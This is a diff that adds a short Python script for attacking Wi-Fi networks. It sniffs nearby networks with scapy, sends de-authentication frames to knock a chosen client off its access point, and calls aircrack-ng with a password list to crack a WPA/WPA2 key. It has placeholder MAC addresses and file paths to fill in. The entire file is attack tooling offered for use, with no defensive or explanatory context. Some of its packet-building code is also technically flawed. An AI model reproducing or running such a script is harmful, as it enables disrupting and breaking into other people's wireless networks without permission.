@@ -1,0 +1,52 @@
+import os
+import subprocess
+from scapy.all import *
+
+def scan_networks(interface):
+    """Scan for nearby wireless networks."""
+    print("[*] Scanning for nearby wireless networks...")
+    networks = set()
+
+    # Sniff for wireless packets
+    def packet_handler(pkt):
+        if pkt.haslayer(Dot11):
+            networks.add(pkt[Dot11].ssid)
+
+    sniff(iface=interface, prn=packet_handler, timeout=10)
+    return networks
+
+def deauth_attack(interface, target_mac, ap_mac):
+    """Perform a de-authentication attack."""
+    print(f"[*] Sending de-authentication packets to {target_mac}...")
+    for _ in range(10):  # Send 10 de-auth packets
+        send(Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac, subtype=0xc0), iface=interface, verbose=False)
+    print("[*] De-authentication packets sent.")
+
+def crack_wpa(interface, capture_file, password_list):
+    """Crack WPA/WPA2 using aircrack-ng."""
+    print("[*] Cracking WPA/WPA2 password...")
+    command = f"aircrack-ng -w {password_list} {capture_file}"
+    os.system(command)
+
+def main():
+    interface = "wlan0"  # Change this to your wireless interface
+    print(f"[*] Using interface: {interface}")
+
+    # Step 1: Scan for networks
+    networks = scan_networks(interface)
+    print("[*] Found networks:")
+    for ssid in networks:
+        print(f"    - {ssid}")
+
+    # Example usage of deauth attack
+    target_mac = "00:11:22:33:44:55"  # Replace with target MAC address
+    ap_mac = "66:77:88:99:AA:BB"       # Replace with AP MAC address
+    deauth_attack(interface, target_mac, ap_mac)
+
+    # Example usage of WPA cracking
+    capture_file = "path/to/capture_file.cap"  # Path to your capture file
+    password_list = "path/to/password_list.txt" # Path to your password list
+    crack_wpa(interface, capture_file, password_list)
+
+if __name__ == "__main__":
+    main()
